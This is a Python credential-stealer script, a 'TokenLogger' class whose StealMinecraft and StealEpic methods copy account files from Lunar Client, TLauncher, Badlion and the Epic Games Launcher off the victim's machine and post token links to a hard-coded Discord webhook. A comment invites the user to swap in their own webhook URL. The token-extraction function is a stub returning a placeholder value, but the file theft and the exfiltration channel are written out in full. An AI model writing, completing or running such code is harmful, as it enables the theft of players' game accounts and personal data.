import os
import shutil
import requests


class TokenLogger:
    def __init__(self):
        self.temp_path = os.path.expanduser("~/tmp")  # Define temp_path here
        self.webhook_url = "https://discord.com/api/webhooks/1245078578626953328/C3F1oQy4oYc92jroCuDFxvidH7dBNn5WHWCHrmJ3RCrfx87B5i5stXPqr6mJqQCwWP4b"  # Replace with your webhook URL
        self.StealMinecraft()
        self.StealEpic()

    def SendTokenLink(self, token_link: str) -> None:
        data = {"content": token_link}
        requests.post(self.webhook_url, json=data)

    def StealMinecraft(self) -> None:
        save_to_path = os.path.join(self.temp_path, "Games", "Minecraft")
        minecraft_paths = {
            "Lunar": os.path.join(os.getenv("userprofile"), ".lunarclient", "settings", "game", "accounts.json"),
            "TLauncher": os.path.join(os.getenv("appdata"), ".minecraft", "TlauncherProfiles.json"),
            "Badlion": os.path.join(os.getenv("appdata"), "Badlion Client", "accounts.json"),
        }

        for name, path in minecraft_paths.items():
            if os.path.isfile(path):
                try:
                    os.makedirs(os.path.join(save_to_path, name), exist_ok=True)
                    shutil.copy(path, os.path.join(save_to_path, name, os.path.basename(path)))
                    # Assuming token is extracted from accounts file, send token link
                    token_link = f"https://minecraft.net/login?token={self.extract_token(path)}"
                    self.SendTokenLink(token_link)
                except Exception:
                    continue

    def StealEpic(self) -> None:
        save_to_path = os.path.join(self.temp_path, "Games", "Epic")
        epic_paths = {
            "EpicGamesLauncher": os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini"),
        }

        for name, path in epic_paths.items():
            if os.path.isfile(path):
                try:
                    os.makedirs(os.path.join(save_to_path, name), exist_ok=True)
                    shutil.copy(path, os.path.join(save_to_path, name, os.path.basename(path)))
                    # Assuming token is extracted from config file, send token link
                    token_link = "https://www.epicgames.com/account/v2/ajaxFetchLoggedInUser?_=%28%29"
                    self.SendTokenLink(token_link)
                except Exception:
                    continue

    def extract_token(self, accounts_file: str) -> str:
        # Code to extract token from accounts file goes here
        return "sample_token"


if __name__ == "__main__":
    TokenLogger()